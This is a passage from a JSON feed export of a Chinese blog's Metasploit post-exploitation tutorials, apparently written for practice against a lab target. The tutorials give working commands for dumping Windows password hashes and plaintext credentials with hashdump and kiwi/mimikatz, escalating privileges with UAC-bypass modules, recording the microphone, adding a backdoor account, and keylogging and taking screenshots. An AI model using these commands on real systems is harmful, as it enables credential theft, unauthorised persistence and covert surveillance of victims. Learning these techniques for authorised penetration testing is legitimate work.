data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493985741.png\" alt=\"1644493985741\"></p>\n<p>2  还可以通过导出SAM数据库中的本地用户账号（注意需要提权到SYSTEM）</p>\n<p>run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493996549.png\" alt=\"1644493996549\"></p>\n<table>\n<thead>\n<tr>\n<th>用户名</th>\n<th>SID</th>\n<th>LM哈希:</th>\n<th>NTLM哈希1:::</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mb</td>\n<td>1000</td>\n<td>aad3b435b51404eeaad3b435b51404ee</td>\n<td>32ed87bdb5fdc5e9cba88547376818d4</td>\n</tr>\n</tbody></table>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494007420.png\" alt=\"1644494007420\"></p>\n<p>3  使用  hashdump 获取密码（注意需要提权到SYSTEM才能使用）</p>\n<p>终端内输入  run hashdump</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494019182.png\" alt=\"1644494019182\"></p>\n<p>使用在线解析工具  <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY21kNS5jb20v\">https://www.cmd5.com/</span></p>\n<p>NTLM哈希 例子：32ed87bdb5fdc5e9cba88547376818d4</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494029236.png\" alt=\"1644494029236\"></p>\n<p>4  使用load kiwi（使用kiwi模块需要system权限）</p>\n<p>kiwi_cmd 模块可以让我们使用mimikatz的全部功能， mimikatz 的命令直接在kiwi_cmd里直接使用</p>\n<p>5.1 终端输入  load kiwi</p>\n<p>5.2 creds_all  直接获取密码</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494040171.png\" alt=\"1644494040171\"></p>\n<p>5.3 使用  kiwi_cmd sekurlsa::logonpasswords  获取密码</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494050257.png\" alt=\"1644494050257\"></p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>kiwi参数和描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>creds_all：列举所有凭据</td>\n</tr>\n<tr>\n<td>2</td>\n<td>creds_kerberos：列举所有kerberos凭据</td>\n</tr>\n<tr>\n<td>3</td>\n<td>creds_msv：列举所有msv凭据</td>\n</tr>\n<tr>\n<td>4</td>\n<td>creds_ssp：列举所有ssp凭据</td>\n</tr>\n<tr>\n<td>5</td>\n<td>creds_tspkg：列举所有tspkg凭据</td>\n</tr>\n<tr>\n<td>6</td>\n<td>creds_wdigest：列举所有wdigest凭据</td>\n</tr>\n<tr>\n<td>7</td>\n<td>dcsync：通过DCSync检索用户帐户信息</td>\n</tr>\n<tr>\n<td>8</td>\n<td>dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</td>\n</tr>\n<tr>\n<td>9</td>\n<td>golden_ticket_create：创建黄金票据</td>\n</tr>\n<tr>\n<td>10</td>\n<td>kerberos_ticket_list：列举kerberos票据</td>\n</tr>\n<tr>\n<td>11</td>\n<td>kerberos_ticket_purge：清除kerberos票据</td>\n</tr>\n<tr>\n<td>12</td>\n<td>kerberos_ticket_use：使用kerberos票据</td>\n</tr>\n<tr>\n<td>13</td>\n<td>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</td>\n</tr>\n<tr>\n<td>14</td>\n<td>lsa_dump_sam：dump出lsa的SAM</td>\n</tr>\n<tr>\n<td>15</td>\n<td>lsa_dump_secrets：dump出lsa的密文</td>\n</tr>\n<tr>\n<td>16</td>\n<td>password_change：修改密码</td>\n</tr>\n<tr>\n<td>17</td>\n<td>wifi_list：列出当前用户的wifi配置文件</td>\n</tr>\n<tr>\n<td>18</td>\n<td>wifi_list_shared：列出共享wifi配置文件&#x2F;编码</td>\n</tr>\n</tbody></table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/",
            "title": "后渗透之提权Windows",
            "date_published": "2023-01-12T13:24:23.000Z",
            "content_html": "<h1 id=\"一、环境准备\"><a href=\"#一、环境准备\" class=\"headerlink\" title=\"一、环境准备\"></a>一、环境准备</h1><p>1 MSF-Metasploit Framework</p>\n<p>2 一台windiows靶机</p>\n<h1 id=\"二、实战\"><a href=\"#二、实战\" class=\"headerlink\" title=\"二、实战\"></a>二、实战</h1><p>1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png\" alt=\"1644493116225\"></p>\n<p>方法一、 meterpreter中输入：getsystem</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png\" alt=\"1644493125642\"></p>\n<p>方法二、使用msf模块提权</p>\n<p>要想提权必须是已经拿到meterpreter  然后将当前meterpreter 后台 meterprerer中输入  background</p>\n<p>1、 查看可用模块  MSF终端中输入   search bypassuac   查看提权模块</p>\n<p>2、 选择一个适合当前系统的提权模块  我这边使用的是win10系统</p>\n<p>那我们使用：use  exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_windows_store_reg  尝试提权</p>\n<p>这个模块不行就换一个 use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p>\n<p>或者  use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_dotnet_profiler</p>\n<p>3 配置模块使用参数   终端内输入： show options</p>\n<p>4 可以看到需要配置 session  终端内输入：set session  {需要提权的session id}</p>\n<p>5 执行提权  终端内输入：run</p>\n<p>6 获取到meterpreter后 我们在终端内 输入getuid 看实际还没有提权成功  需要在还终端内在输入 getsystem 获取权限 </p>\n<p>7 获取权限完成后 输入getuid 即可看到  已经获取到SYSTEM 最高权限了</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png\" alt=\"1644493163472\"></p>\n<p>看到这个证明已经将权限提升成功</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/",
            "title": "后渗透之调用音频设备录音",
            "date_published": "2023-01-12T13:20:15.000Z",
            "content_html": "<p>一、环境准备<br>MSF-Metasploit Framework<br>一台安装手机或者模拟器<br>二、实践</p>\n<p>record_mic  包含4个可选参数 分别为</p>\n<p>-d  是设置录音时长的</p>\n<p>-f 设置未见路径的</p>\n<p>-h  查看帮助的</p>\n<p>-p  控制自动播放的</p>\n<p>一条简单的录音语句</p>\n<p>record_mic -d  10 -p true</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/",
            "title": "后渗透之创建账户Windows",
            "date_published": "2023-01-12T13:17:00.000Z",
            "content_html": "<p>一、环境准备</p>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台获取到meterpreter的靶机</p>\n<p>二、实际操作</p>\n<p>1、先看下目标靶机已存在用户  meterpreter中输入：run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users</p>\n<p>![1643108073546](22 后渗透之创建账户（Windows）.assets&#x2F;1643108073546.png) </p>\n<p>2、使用getgui创建 一个用户名为 msb  密码为 123456  的账户</p>\n<p>run getgui -u msb -p 123456</p>\n<p>run getgui -u {用户名}-p {密码}</p>\n<p>进入win的运行输入netplwiz 可以查看账户创建情况</p>\n<p>![1643108092979](22 后渗透之创建账户（Windows）.assets&#x2F;1643108092979.png)</p>\n<p>[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到system）</p>\n<p>2.1 绕过UAC提权</p>\n<p>use exploit&#x2F;windows&#x2F;local&#x2F;<em>ask</em></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/",
            "title": "后渗透之下载文件屏幕截图键盘记录",
            "date_published": "2023-01-12T13:08:41.000Z",
            "content_html": "<p>第21课 ：后渗透之上传下载文件</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">ID</th>\n<th>Command</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">1</td>\n<td>upload</td>\n<td align=\"center\">传文件到靶机</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td>download</td>\n<td align=\"center\">从靶机下载文件</td>\n</tr>\n</tbody></table>\n<p>第22课：后渗透之屏幕截图</p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>screenshot</td>\n<td>截图（Windows）</td>\n</tr>\n</tbody></table>\n<p>第23课：后渗透之键盘记录</p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Conmmand</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>keyscan_start</td>\n<td>启动键盘记录(Windows)</td>\n</tr>\n<tr>\n<td>2</td>\n<td>keyscan_dump</td>\n<td>导出键盘(Windows)</td>\n</tr>\n<tr>\n<td>3</td>\n<td>keyscan_stop</td>\n<td>停止键盘记录(Windows)</td>\n</tr>\n</tbody></table>\n",
            "tags": []
        }
    ]
}